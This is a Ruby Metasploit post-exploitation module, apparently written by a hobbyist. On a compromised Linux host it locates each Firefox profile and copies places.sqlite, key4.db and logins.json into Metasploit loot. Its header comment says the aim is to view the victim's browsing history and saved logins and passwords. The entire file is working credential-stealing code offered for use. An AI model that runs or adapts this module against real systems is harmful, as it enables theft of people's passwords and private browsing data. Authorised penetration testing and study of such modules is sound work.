##
# $Id: firefox_history_login_exfil.rb  
##

#-------------------------------------------------#
# This program reads and copies the places.db
# and keys.db/logins.json files for linux machines
# with firefox. With these files, you can replace
# the files on your machine to see the victims
# history/logins/passwords without decrypting them
#-------------------------------------------------#


require 'msf/core' 

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Auxiliary::Report

def initialize 
    super(
          'Name' => 'Steal FireFox history and logins',   
          'Version' => '$Version 1$', 
          'Description' => 'Steals History Database and login information', 
          'Author' => 'chan_hake', 
          'License' => MSF_LICENSE 
)
     
end

def run

begin 
puts "Beginning Exploit"

#Build User Path
directory2 = "/.mozilla/firefox/"
user = whoami
directory1 = "/home/" << user << directory2

#Searches for Files in Directories
dir(directory1).each do |dir|
 puts dir
 file1 = ' '
 file2 = ' '
 file3 = ' '
 file1 = directory1 + dir
 file2 = directory1 + dir
 file3 = directory1 + dir

 #Appends names to directories to read file
 file1 = file1 + "/places.sqlite"
 file2 = file2 + "/key4.db"
 file3 = file3 + "/logins.json"
 
 #HISTORY DATABASE
 if exists?(file1)
 	f1_data = read_file(file1)
 	#Store File
 	store_loot("places.db", "bin", session ,f1_data)
 	puts "History Success"
 else
 	puts "History Not Found"
 end
 
 #KEY4 DATABASE
 if exists?(file2)
 	f1_data = read_file(file2)
 	#Store File
 	store_loot("key4.db", "bin", session ,f1_data)
 	puts "Key4 Success"
 else
 	puts "Key4 Not Found"
 end
 
 #LOGINS.JSON FILE
 if exists?(file3)
 	f1_data = read_file(file3)
 	#Store File
 	store_loot("logins.json", "bin", session ,f1_data)
 	puts "logins.json Success"
 else
 	puts "logins.json Not Found"
 end
 	#Formatting
 	puts " "
 	puts "---------------------------"
	puts " "
 
 end
 
#END
end
end
end 